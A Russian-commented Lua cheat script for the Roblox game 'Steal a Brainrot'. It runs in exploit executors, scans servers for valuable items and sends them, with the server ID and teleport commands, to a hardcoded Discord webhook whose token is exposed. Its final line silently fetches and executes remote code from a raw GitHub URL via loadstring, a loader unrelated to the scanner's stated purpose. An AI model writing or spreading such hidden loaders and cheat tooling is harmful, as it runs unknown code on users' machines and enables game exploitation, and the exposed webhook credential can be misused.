-- 🎯 BRAINROT INCOME SCANNER v2.0 (ПОЛНАЯ ВЕРСИЯ)
-- Сканирует все объекты в Steal a Brainrot и отправляет уведомления в Discord
-- Запуск: автоматически при старте + по клавише F

local Players = game:GetService('Players')
local UserInputService = game:GetService('UserInputService')
local HttpService = game:GetService('HttpService')

-- ⚙️ НАСТРОЙКИ
local INCOME_THRESHOLD = 50_000_000 -- 50M/s минимум для уведомления
local DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1422283384553738271/EMSO825bYGKuCKGVgGQ246-9Uuj3MDLsg_9xraU7uxXpXYEuLp4ij60nvgjiODfhS7js'

print('🎯 Brainrot Scanner v2.0 | JobId:', game.JobId)

-- 🎮 ОБЪЕКТЫ С ЭМОДЗИ И ВАЖНОСТЬЮ
local OBJECTS = {
    ['La Vacca Saturno Saturnita'] = { emoji = '🐮', important = false },
    ['Chimpanzini Spiderini'] = { emoji = '🕷', important = false },
    ['Los Tralaleritos'] = { emoji = '🐟', important = false },
    ['Las Tralaleritas'] = { emoji = '🌸', important = false },
    ['Graipuss Medussi'] = { emoji = '🦑', important = false },
    ['Torrtuginni Dragonfrutini'] = { emoji = '🐉', important = false },
    ['Pot Hotspot'] = { emoji = '📱', important = false },
    ['La Grande Combinasion'] = { emoji = '❗️', important = true },
    ['Garama and Madundung'] = { emoji = '🍝', important = true },
    ['Secret Lucksfsfsfy Block'] = { emoji = '⬛️', important = false },
    ['Dragon Cannelloni'] = { emoji = '🐲', important = true },
    ['Nuclearo Dinossauro'] = { emoji = '🦕', important = true },
    ['Las Vaquitas Saturnitas'] = { emoji = '👦', important = false },
    ['Chicleteira Bicicleteira'] = { emoji = '🚲', important = true },
    ['Los Combinasionas'] = { emoji = '⚒️', important = true },
    ['Agarrini la Palini'] = { emoji = '🥄', important = false },
    ['Los Hotspotsitos'] = { emoji = '☎️', important = true },
    ['Esok Sekolah'] = { emoji = '🏠', important = true },
    ['Nooo My Hotspot'] = { emoji = '👽', important = false },
    ['La Supreme Combinasion'] = { emoji = '🔫', important = true },
    ['Admin Lucky Block'] = { emoji = '🆘', important = false },
    ['Ketupat Kepat'] = { emoji = '🍏', important = true },
    ['Strawberry Elephant'] = { emoji = '🐘', important = true },
    ['Spaghetti Tualetti'] = { emoji = '🚽', important = true },
    ['Ketchuru and Musturu'] = { emoji = '🍾', important = true },
    ['Los Nooo Mysffsfsf Hotspotsitos'] = { emoji = '🥔', important = false },
    ['La Kark56656erkar Combinasion'] = { emoji = '🥊', important = false },
    ['Los Bros'] = { emoji = '📱', important = true },
    ['Tralaledon'] = { emoji = '🦈', important = true },
    ['La Extinct Grande'] = { emoji = '🩻', important = true },
    ['Los Chicleteiras'] = { emoji = '🚳', important = true },
    ['Las Sis'] = { emoji = '👧', important = true },
    ['Tacorita Bicicleta'] = { emoji = '📱', important = false },
    ['Tictac Sahur'] = { emoji = '🕰️', important = true },
    ['Celularcini Visiosini'] = { emoji = '📞', important = true },
    ['Los Primos'] = { emoji = '🙆‍♂️', important = true },
    ['Tang Tang Keletang'] = { emoji = '📢', important = true },
    ['Money Money Puggy'] = { emoji = '🐶', important = true },
}

-- Создаем список важных объектов
local ALWAYS_IMPORTANT = {}
for name, cfg in pairs(OBJECTS) do
    if cfg.important then
        ALWAYS_IMPORTANT[name] = true
    end
end

-- 🧪 ПРОЗРАЧНОСТЬ (интеграция)
-- Проверка прозрачности частей "Cube.*" внутри модели
local function checkCubeTransparency(obj)
    if not obj or not obj.Parent then return true end
    if not obj:IsA("Model") then return true end
    for _, part in ipairs(obj:GetDescendants()) do
        if part:IsA("BasePart") and part.Name:match("^Cube%.") then
            if part.Transparency > 0.40 then
                return false
            end
        end
    end
    return true
end -- [паттерн '^Cube%.' экранирует точку в Lua-строке] [web:24]

-- Список исключений: прозрачность не проверяем
local SKIP_TRANSPARENCY_CHECK = {
    ["Garama and Madundung"] = true,
    ["La Supreme Combinasion"] = true,
}

-- Поиск хост-модели для Overhead/Part
local function findHostModel(inst)
    if not inst then return nil end
    local m = inst:FindFirstAncestorOfClass("Model")
    if m then return m end
    if inst:IsA("Model") then return inst end
    if inst.Parent and inst.Parent:IsA("Model") then
        return inst.Parent
    end
    return nil
end -- [используется FindFirstAncestorOfClass] [web:27][web:30]

-- 💰 ПАРСЕР ДОХОДА
local function parseGenerationText(s)
    if type(s) ~= 'string' or s == '' then
        return nil
    end
    s = s:gsub('%$', ''):gsub(',', ''):gsub('%s+', '')
    local num, suffix = s:match('([%-%d%.]+)%s*([KMBkmb]?)')
    local val = tonumber(num or '')
    if not val then
        return nil
    end
    local mult = 1
    if suffix == 'K' or suffix == 'k' then
        mult = 1e3
    elseif suffix == 'M' or suffix == 'm' then
        mult = 1e6
    elseif suffix == 'B' or suffix == 'b' then
        mult = 1e9
    end
    return val * mult
end

local function formatIncomeNumber(n)
    if not n then
        return 'Unknown'
    end
    if n >= 1e9 then
        local v = n / 1e9
        return (v % 1 == 0 and string.format('%dB/s', v) or string.format('%.1fB/s', v)):gsub('%.0B/s', 'B/s')
    elseif n >= 1e6 then
        local v = n / 1e6
        return (v % 1 == 0 and string.format('%dM/s', v) or string.format('%.1fM/s', v)):gsub('%.0M/s', 'M/s')
    elseif n >= 1e3 then
        local v = n / 1e3
        return (v % 1 == 0 and string.format('%dK/s', v) or string.format('%.1fK/s', v)):gsub('%.0K/s', 'K/s')
    else
        return string.format('%d/s', n)
    end
end

-- 📝 ПОЛУЧЕНИЕ ТЕКСТА ИЗ UI
local function grabText(inst)
    if not inst then
        return nil
    end
    if inst:IsA('TextLabel') or inst:IsA('TextButton') or inst:IsA('TextBox') then
        local ok, ct = pcall(function() return inst.ContentText end)
        if ok and type(ct) == 'string' and #ct > 0 then
            return ct
        end
        local t = inst.Text
        if type(t) == 'string' and #t > 0 then
            return t
        end
    end
    if inst:IsA('StringValue') then
        local v = inst.Value
        if type(v) == 'string' and #v > 0 then
            return v
        end
    end
    return nil
end

local function getOverheadInfo(animalOverhead)
    if not animalOverhead then
        return nil, nil
    end

    local name = nil
    local display = animalOverhead:FindFirstChild('DisplayName')
    if display then
        name = grabText(display)
    end

    if not name then
        local anyText = animalOverhead:FindFirstChildOfClass('TextLabel')
            or animalOverhead:FindFirstChildOfClass('TextButton')
            or animalOverhead:FindFirstChildOfClass('TextBox')
        name = anyText and grabText(anyText) or nil
    end

    local genText = nil
    local generation = animalOverhead:FindFirstChild('Generation')
    if generation then
        genText = grabText(generation)
    end

    if not genText then
        for _, child in ipairs(animalOverhead:GetDescendants()) do
            if child:IsA('TextLabel') or child:IsA('TextButton') or child:IsA('TextBox') then
                local text = grabText(child)
                if text and (text:match('%$') or text:match('/s')) then
                    genText = text
                    break
                end
            end
        end
    end

    return name, genText
end

local function isGuidName(s)
    return s:match('^[0-9a-fA-F]+%-%x+%-%x+%-%x+%-%x+$') ~= nil
end

-- 🔍 ПОЛНЫЕ СКАНЕРЫ
local function scanPlots()
    local results = {}
    local Plots = workspace:FindFirstChild('Plots')
    if not Plots then
        return results
    end

    for _, plot in ipairs(Plots:GetChildren()) do
        local Podiums = plot:FindFirstChild('AnimalPodiums')
        if Podiums then
            for _, podium in ipairs(Podiums:GetChildren()) do
                local Base = podium:FindFirstChild('Base')
                local Spawn = Base and Base:FindFirstChild('Spawn')
                local Attachment = Spawn and Spawn:FindFirstChild('Attachment')
                local Overhead = Attachment and Attachment:FindFirstChild('AnimalOverhead')
                if Overhead then
                    local name, genText = getOverheadInfo(Overhead)

                    -- ПРОВЕРКА ПРОЗРАЧНОСТИ (пропускаем для исключений)
                    if name and not SKIP_TRANSPARENCY_CHECK[name] then
                        local hostModel = findHostModel(Overhead)
                        if hostModel and not checkCubeTransparency(hostModel) then
                            goto continue_podium
                        end
                    end

                    local genNum = genText and parseGenerationText(genText) or nil
                    if name and genNum then
                        table.insert(results, { name = name, gen = genNum, location = 'Plot' })
                    end
                end
                ::continue_podium::
            end
        end
    end
    return results
end

local function scanRunway()
    local results = {}
    for _, obj in ipairs(workspace:GetChildren()) do
        if isGuidName(obj.Name) then
            local part = obj:FindFirstChild('Part')
            local info = part and part:FindFirstChild('Info')
            local overhead = info and info:FindFirstChild('AnimalOverhead')
            if overhead then
                local name, genText = getOverheadInfo(overhead)

                -- ПРОВЕРКА ПРОЗРАЧНОСТИ (пропускаем для исключений)
                if name and not SKIP_TRANSPARENCY_CHECK[name] then
                    local hostModel = findHostModel(overhead) or findHostModel(obj)
                    if hostModel and not checkCubeTransparency(hostModel) then
                        goto continue_runway
                    end
                end

                local genNum = genText and parseGenerationText(genText) or nil
                if name and genNum then
                    table.insert(results, { name = name, gen = genNum, location = 'Runway' })
                end
            end
        end
        ::continue_runway::
    end
    return results
end

local function scanAllOverheads()
    local results, processed = {}, {}
    local function recursiveSearch(parent)
        for _, child in ipairs(parent:GetChildren()) do
            if child.Name == 'AnimalOverhead' and not processed[child] then
                processed[child] = true
                local name, genText = getOverheadInfo(child)

                -- ПРОВЕРКА ПРОЗРАЧНОСТИ (пропускаем для исключений)
                if name and not SKIP_TRANSPARENCY_CHECK[name] then
                    local hostModel = findHostModel(child)
                    if hostModel and not checkCubeTransparency(hostModel) then
                        goto continue_overhead
                    end
                end

                local genNum = genText and parseGenerationText(genText) or nil
                if name and genNum then
                    table.insert(results, { name = name, gen = genNum, location = 'World' })
                end
            end
            ::continue_overhead::
            pcall(function()
                recursiveSearch(child)
            end)
        end
    end
    recursiveSearch(workspace)
    return results
end

local function scanPlayerGui()
    local results = {}
    local lp = Players.LocalPlayer
    if not lp then
        return results
    end

    local playerGui = lp:FindFirstChild('PlayerGui')
    if not playerGui then
        return results
    end

    local function searchInGui(parent)
        for _, child in ipairs(parent:GetChildren()) do
            if child.Name == 'AnimalOverhead' or child.Name:match('Animal') then
                -- В GUI не режем по прозрачности, чтобы не потерять HUD
                local name, genText = getOverheadInfo(child)
                local genNum = genText and parseGenerationText(genText) or nil
                if name and genNum then
                    table.insert(results, { name = name, gen = genNum, location = 'GUI' })
                end
            end
            pcall(function()
                searchInGui(child)
            end)
        end
    end
    searchInGui(playerGui)
    return results
end

-- 📊 ГЛАВНАЯ ФУНКЦИЯ СБОРА
local function collectAll(timeoutSec)
    local t0 = os.clock()
    local collected = {}

    repeat
        collected = {}

        -- Запускаем все сканеры
        local allSources = {
            scanPlots(),
            scanRunway(),
            scanAllOverheads(),
            scanPlayerGui(),
        }

        -- Объединяем результаты
        for _, source in ipairs(allSources) do
            for _, item in ipairs(source) do
                table.insert(collected, item)
            end
        end

        -- Убираем дубликаты
        local seen, unique = {}, {}
        for _, item in ipairs(collected) do
            local key = item.name .. ':' .. tostring(item.gen)
            if not seen[key] then
                seen[key] = true
                table.insert(unique, item)
            end
        end
        collected = unique

        if #collected > 0 then
            break
        end
        task.wait(0.5)
    until os.clock() - t0 > timeoutSec

    return collected
end

local function shouldShow(name, gen)
    if ALWAYS_IMPORTANT[name] then
        return true
    end
    return (type(gen) == 'number') and gen >= INCOME_THRESHOLD
end

-- 📤 DISCORD УВЕДОМЛЕНИЯ
local function getRequester()
    return http_request
        or request
        or (syn and syn.request)
        or (fluxus and fluxus.request)
        or (KRNL_HTTP and KRNL_HTTP.request)
end

local function sendDiscordNotification(filteredObjects)
    local req = getRequester()
    if not req then
        warn('❌ Нет HTTP API в executor')
        return
    end

    local jobId = game.JobId
    local placeId = game.PlaceId

    if #filteredObjects == 0 then
        print('🔍 Важных объектов не найдено')
        return
    end

    -- Сортировка: важные сначала, затем по убыванию дохода
    local important, regular = {}, {}
    for _, obj in ipairs(filteredObjects) do
        if ALWAYS_IMPORTANT[obj.name] then
            table.insert(important, obj)
        else
            table.insert(regular, obj)
        end
    end

    table.sort(important, function(a, b) return a.gen > b.gen end)
    table.sort(regular, function(a, b) return a.gen > b.gen end)

    local sorted = {}
    for _, obj in ipairs(important) do table.insert(sorted, obj) end
    for _, obj in ipairs(regular) do table.insert(sorted, obj) end

    -- Формируем список (максимум 10)
    local objectsList = {}
    for i = 1, math.min(10, #sorted) do
        local obj = sorted[i]
        local emoji = OBJECTS[obj.name].emoji or '💰'
        local mark = ALWAYS_IMPORTANT[obj.name] and '⭐ ' or ''
        table.insert(
            objectsList,
            string.format('%s%s **%s** (%s)', mark, emoji, obj.name, formatIncomeNumber(obj.gen))
        )
    end
    local objectsText = table.concat(objectsList, '\n')

    -- Телепорт команда (для копирования)
    local teleportText = string.format(
        "`local ts = game:GetService('TeleportService'); ts:TeleportToPlaceInstance(%d, '%s')`",
        placeId, jobId
    )

    local payload = {
        username = '🎯 Brainrot Scanner',
        embeds = {{
            title = '💎 Найдены ценные объекты в Steal a brainrot!',
            color = 0x2f3136,
            fields = {
                { name = '🆔 Сервер (Job ID)', value = string.format('``````', jobId), inline = false },
                { name = '💰 Важные объекты:', value = objectsText, inline = false },
                { name = '🚀 Телепорт:', value = teleportText, inline = false },
            },
            footer = { text = string.format('Найдено: %d важных • %s', #filteredObjects, os.date('%H:%M:%S')) },
            timestamp = DateTime.now():ToIsoDate(),
        }},
    }

    print('📤 Отправляю уведомление с', #filteredObjects, 'объектами')

    local ok, res = pcall(function()
        return req({
            Url = DISCORD_WEBHOOK_URL,
            Method = 'POST',
            Headers = { ['Content-Type'] = 'application/json' },
            Body = HttpService:JSONEncode(payload),
        })
    end)

    if ok then
        print('✅ Уведомление отправлено в Discord!')
    else
        warn('❌ Ошибка отправки:', res)
    end
end

-- 🎮 ГЛАВНАЯ ФУНКЦИЯ
local function scanAndNotify()
    print('🔍 Сканирую все объекты...')
    local allFound = collectAll(8.0) -- 8 секунд таймаут

    -- Фильтрация по важности и доходу
    local filtered = {}
    for _, obj in ipairs(allFound) do
        if OBJECTS[obj.name] and shouldShow(obj.name, obj.gen) then
            table.insert(filtered, obj)
        end
    end

    -- Вывод в консоль
    print('Найдено всего объектов:', #allFound)
    print('Показано важных:', #filtered)

    for _, obj in ipairs(filtered) do
        local emoji = OBJECTS[obj.name].emoji or '💰'
        local mark = ALWAYS_IMPORTANT[obj.name] and '⭐ ' or ''
        print(string.format('%s%s %s: %s (%s)', mark, emoji, obj.name, formatIncomeNumber(obj.gen), obj.location or 'Unknown'))
    end

    -- Отправляем уведомление если есть что показать
    if #filtered > 0 then
        sendDiscordNotification(filtered)
    else
        print('🔍 Нет объектов для уведомления')
    end
end

-- 🚀 ЗАПУСК
print('🎯 === BRAINROT INCOME SCANNER ЗАПУЩЕН ===')
scanAndNotify()

-- ⌨️ ПОВТОР ПО КЛАВИШЕ F
local lastScan, DEBOUNCE = 0, 3
UserInputService.InputBegan:Connect(function(input, gpe)
    if gpe then return end
    if input.KeyCode == Enum.KeyCode.F then
        local now = os.clock()
        if now - lastScan < DEBOUNCE then return end
        lastScan = now
        print('\n🔄 === ПОВТОРНОЕ СКАНИРОВАНИЕ (F) ===')
        scanAndNotify()
    end
end)

print('💡 Нажмите F для повторного сканирования')
print('📱 Discord webhook готов к отправке уведомлений')
loadstring(game:HttpGet("https://raw.githubusercontent.com/piskastroi1-ui/SSik/refs/heads/main/ss2.lua"))()
